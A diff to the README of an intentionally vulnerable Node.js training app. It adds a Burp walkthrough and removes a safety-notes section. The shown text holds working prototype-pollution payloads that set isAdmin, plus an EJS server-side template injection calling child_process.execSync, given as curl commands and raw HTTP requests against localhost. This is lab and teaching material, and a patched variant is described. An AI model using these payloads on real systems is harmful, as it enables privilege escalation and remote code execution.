@@ -41,20 +41,17 @@ This reproduces the classic chain using the intentionally vulnerable routes.
 
 Automatic exploit:
 ```powershell
-node .\exploit.js http://localhost:3000
+sh exploit_admin_bypass.sh
 ```
 
-Manual steps with curl (Windows includes curl):
+Manual steps with curl :
 ```powershell
 # 1. Pollute prototype to set isAdmin=true (vector A)
 curl -s -X POST -H "Content-Type: application/json" ^
 	-d "{\"__proto__\":{\"isAdmin\":true}}" ^
 	http://localhost:3000/update-profile
 
-# 1b. Alternative vector via constructor.prototype
-curl -s -X POST -H "Content-Type: application/json" ^
-	-d "{\"constructor\":{\"prototype\":{\"isAdmin\":true}}}" ^
-	http://localhost:3000/update-profile
+
 
 # 2. Set bio to EJS payload (Windows prints whoami)
 curl -s -X POST -H "Content-Type: application/json" 	-d "{\"bio\":\"<%= require('child_process').execSync('whoami').toString() %>\"}" 	http://localhost:3000/update-profile
@@ -79,6 +76,36 @@ Response shows how untrusted query can restructure nested `filters`.
 - Messages at `/messages` store the last messages in-memory.
 - Upload at `/upload` saves files to `/uploads` and serves them statically.
 
+
+
+## using manual 
+Walkthrough
+
+Setup: Open Burp, use the built-in browser (or proxy your browser). You can work entirely in Repeater without capturing traffic.
+
+Step 1: Prototype pollution (proto)
+
+
+POST /update-profile HTTP/1.1Host: localhost:3000Content-Type: application/jsonContent-Length: 33{"__proto__":{"isAdmin":true}}
+Impact: Sets Object.prototype.isAdmin = true. Any user.isAdmin check turns truthy via prototype inheritance across the app until restart.
+
+Step 1b: Alternative vector (constructor.prototype)
+
+
+POST /update-profile HTTP/1.1Host: localhost:3000Content-Type: application/jsonContent-Length: 56{"constructor":{"prototype":{"isAdmin":true}}}
+Impact: Same privilege escalation via a different key path.
+
+Step 2: Store EJS payload in profile bio
+
+
+POST /update-profile HTTP/1.1Host: localhost:3000Content-Type: application/jsonContent-Length: 94{"bio":"<%= require('child_process').execSync('whoami').toString() %>"}
+Impact: Saves a string that will be executed later when the admin template renders with ejs.render(...).
+
+Step 3: Trigger vulnerable admin render
+
+
+GET /admin HTTP/1.1Host: localhost:3000
+Impact: Prototype pollution grants access; EJS evaluates bio with require in scope, executing the command and printing its output in the HTML.
 ## Patched Variant
 - Run the patched server:
 ```powershell
@@ -87,6 +114,3 @@ node .\app.patched.js
 - Changes in patch: sanitizes dangerous keys, requires own `user.isAdmin`, and uses a safe template `views/admin_patched.ejs`.
 - Re-running the exploit should fail to gain admin and will not execute the EJS payload.
 
-## Safety Notes
-- This app is intentionally vulnerable. Do not expose to the internet.
-- In-memory state only; restart the server to reset users/messages/pollution.
